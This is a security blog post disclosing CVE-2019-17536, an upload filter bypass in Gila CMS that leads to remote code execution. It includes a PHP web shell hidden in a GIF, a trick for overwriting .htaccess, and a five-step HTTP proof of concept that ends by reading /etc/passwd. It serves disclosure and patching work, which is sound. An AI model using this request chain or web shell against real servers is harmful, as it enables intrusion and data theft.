---
layout: post
title: Gila CMS Upload Filter Bypass and RCE
date: 2019-10-13
categories:
  - disclosure
  - websec
  - security
tags:
  - disclosure
  - php
  - security
  - websec
  - rce
  - CVE-2019-17536
image: /assets/images/2019-10-13-gila-cms-upload-bypass-and-rce/shell-on-server.png
---
Versions prior to and including 1.11.4 of Gila CMS are vulnerable to remote code execution by users that are permitted to upload media files. It is possible to bypass the media asset upload restrictions that are in place to prevent arbitrary PHP being executed on the server by abusing a combination of two issues.

The first is the support for uploading animated GIFs. By submitting a GIF that contains the following content we can place a GIF file that contains [currently unexecutable] PHP code in a GIF file on the server (in this case `test.gif`):

```php
GIF89a; <?=`$_GET[1]`?>
```

After uploading this, the file can now be clicked and the move function can be used to move this into another directory within the application directory with a PHP extension (in this case, it is moved to `tmp/media_thumb/shell.php`):

![](/assets/images/2019-10-13-gila-cms-upload-bypass-and-rce/rename.png)

As can be seen in the below screenshot, this is now stored on the server with a valid extension:

![](/assets/images/2019-10-13-gila-cms-upload-bypass-and-rce/shell-on-server.png)

At this point, the PHP file cannot be executed as the htaccess file found in `tmp/.htaccess` contains the following configuration:

```xml
<Files *.php>
deny from all
</Files>
```

This prevents any PHP files under `tmp/` being accessed. However, the same upload vulnerability can be abused to overwrite the htaccess file. To do this, one uploads a GIF file again but with the content:

```
# GIF89a;
```

This creates a GIF file on the server, that starts with a valid comment character, which prevents the server running into an error when parsing it during subsequent requests. The same rename bug can then be used to move this file to `tmp/.htaccess`:

![](/assets/images/2019-10-13-gila-cms-upload-bypass-and-rce/htaccess.png)

After doing this, the PHP file can be accessed from the web browser, and remote code execution is gained as can be seen in the below screenshot in which `cat /etc/passwd` is executed:

![](/assets/images/2019-10-13-gila-cms-upload-bypass-and-rce/shell.png)

Versions Affected
-----------------
<= 1.11.4

Solution
--------
Update to a version later than 1.11.4 or apply the patch found at [https://github.com/GilaCMS/gila/pull/49](https://github.com/GilaCMS/gila/pull/49)

CVSS v3 Vector
--------------
[AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L/E:P/RL:T/RC:R](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L/E:P/RL:T/RC:R&version=3.1)

Disclosure Timeline
-------------------
- **2019-10-12**: Vulnerability found
- **2019-10-13**: Patch created and pull request sent to project
- **2019-10-13**: CVE requested
- **2019-10-13**: CVE-2019-17536 assigned

Proof of Concept
----------------
**Step 1: Store blank htaccess stager**
```http
POST /gila/admin/media_upload HTTP/1.1
Host: 192.168.194.146
Content-Length: 510
Origin: http://192.168.194.146
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOYDZotidj55MOMPD
Accept: */*
Referer: http://192.168.194.146/gila/admin/media
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=c4ih0deald5srb1ur1k3jg13fj; GSESSIONID=1tu6xguu1n7t84deh7b6j4f6k83kslsowcmannst8ztgwout3z
Connection: close

------WebKitFormBoundaryOYDZotidj55MOMPD
Content-Disposition: form-data; name="uploadfiles"; filename="test.gif"
Content-Type: image/gif

# GIF89a;

------WebKitFormBoundaryOYDZotidj55MOMPD
Content-Disposition: form-data; name="formToken"

1=^4podpw4k&8%i
------WebKitFormBoundaryOYDZotidj55MOMPD
Content-Disposition: form-data; name="path"

assets
------WebKitFormBoundaryOYDZotidj55MOMPD
Content-Disposition: form-data; name="g_response"

content
------WebKitFormBoundaryOYDZotidj55MOMPD--

```

**Step 2: Overwrite tmp/.htaccess**
```http
POST /gila/fm/move HTTP/1.1
Host: 192.168.194.146
Content-Length: 80
Accept: */*
Origin: http://192.168.194.146
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://192.168.194.146/gila/admin/media
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=c4ih0deald5srb1ur1k3jg13fj; GSESSIONID=1tu6xguu1n7t84deh7b6j4f6k83kslsowcmannst8ztgwout3z
Connection: close

newpath=tmp%2F.htaccess&path=assets%2Ftest.gif&formToken=1%3D%5E4podpw4k%268%25i
```

**Step 3: Upload PHP shell stager**
```http
POST /gila/admin/media_upload HTTP/1.1
Host: 192.168.194.146
Content-Length: 524
Origin: http://192.168.194.146
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOYDZotidj55MOMPD
Accept: */*
Referer: http://192.168.194.146/gila/admin/media
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=c4ih0deald5srb1ur1k3jg13fj; GSESSIONID=1tu6xguu1n7t84deh7b6j4f6k83kslsowcmannst8ztgwout3z
Connection: close

------WebKitFormBoundaryOYDZotidj55MOMPD
Content-Disposition: form-data; name="uploadfiles"; filename="test.gif"
Content-Type: image/gif

GIF89a; <?=`$_GET[1]`?>

------WebKitFormBoundaryOYDZotidj55MOMPD
Content-Disposition: form-data; name="formToken"

1=^4podpw4k&8%i
------WebKitFormBoundaryOYDZotidj55MOMPD
Content-Disposition: form-data; name="path"

assets
------WebKitFormBoundaryOYDZotidj55MOMPD
Content-Disposition: form-data; name="g_response"

content
------WebKitFormBoundaryOYDZotidj55MOMPD--
```

**Step 4: Move PHP shell into tmp/media_thumb/shell.php**
```http
POST /gila/fm/move HTTP/1.1
Host: 192.168.194.146
Content-Length: 94
Accept: */*
Origin: http://192.168.194.146
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://192.168.194.146/gila/admin/media
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=c4ih0deald5srb1ur1k3jg13fj; GSESSIONID=1tu6xguu1n7t84deh7b6j4f6k83kslsowcmannst8ztgwout3z
Connection: close

newpath=tmp%2Fmedia_thumb%2Fshell.php&path=assets%2Ftest.gif&formToken=1%3D%5E4podpw4k%268%25i
```

**Step 5: Execute shell command on remote host**
```http
GET /gila/tmp/media_thumb/shell.php?1=cat%20/etc/passwd HTTP/1.1
Host: 192.168.194.146
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=c4ih0deald5srb1ur1k3jg13fj; GSESSIONID=1tu6xguu1n7t84deh7b6j4f6k83kslsowcmannst8ztgwout3z
Connection: close

```
